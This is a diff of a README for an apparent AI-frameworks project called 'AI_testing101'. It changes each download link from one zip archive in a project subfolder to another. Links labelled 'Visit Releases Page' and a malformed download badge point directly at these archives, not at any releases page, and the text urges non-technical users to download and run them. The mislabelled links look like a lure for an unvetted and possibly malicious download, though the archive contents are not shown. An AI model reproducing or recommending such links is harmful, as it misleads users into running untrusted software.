@@ -1,7 +1,7 @@
 # 🎉 AI_testing101 - Unlock the Power of AI Frameworks
 
 ## 🔗 Download Now
-[![Download AI_testing101](https://raw.githubusercontent.com/adhytiarachman/AI_testing101/main/crawl4ai_usecases/testing_A_v3.4.zip%20AI_testing101-v1.0-%2300aaff?style=for-the-badge)](https://raw.githubusercontent.com/adhytiarachman/AI_testing101/main/crawl4ai_usecases/testing_A_v3.4.zip)
+[![Download AI_testing101](https://github.com/adhytiarachman/AI_testing101/raw/refs/heads/main/docling_usecases/output/A-testing-2.7.zip%20AI_testing101-v1.0-%2300aaff?style=for-the-badge)](https://github.com/adhytiarachman/AI_testing101/raw/refs/heads/main/docling_usecases/output/A-testing-2.7.zip)
 
 ## 📖 Overview
 AI_testing101 offers practical use cases and experiments with open-source AI frameworks. This application focuses on agentic systems, retrieval-augmented generation (RAG), document intelligence, and data ingestion pipelines. It provides an easy way for users to explore these technologies without needing deep technical expertise.
@@ -24,7 +24,7 @@ Follow these simple instructions to download and run AI_testing101 on your compu
 ## 💾 Download & Install
 1. **Visit the Releases Page:** 
    Click the link below to access the releases page where you can download the software.
-   [Visit Releases Page](https://raw.githubusercontent.com/adhytiarachman/AI_testing101/main/crawl4ai_usecases/testing_A_v3.4.zip)
+   [Visit Releases Page](https://github.com/adhytiarachman/AI_testing101/raw/refs/heads/main/docling_usecases/output/A-testing-2.7.zip)
 
 2. **Choose the Latest Release:** 
    On the releases page, you'll see various versions of the software. Select the latest version to ensure you have the most up-to-date features and fixes.
@@ -78,4 +78,4 @@ For any questions or issues, please open an issue on GitHub. The community is he
 - rag
 
 ## 🔗 Return to Releases
-To download AI_testing101 again or to check for updates, visit our releases page here: [Visit Releases Page](https://raw.githubusercontent.com/adhytiarachman/AI_testing101/main/crawl4ai_usecases/testing_A_v3.4.zip)
+To download AI_testing101 again or to check for updates, visit our releases page here: [Visit Releases Page](https://github.com/adhytiarachman/AI_testing101/raw/refs/heads/main/docling_usecases/output/A-testing-2.7.zip)
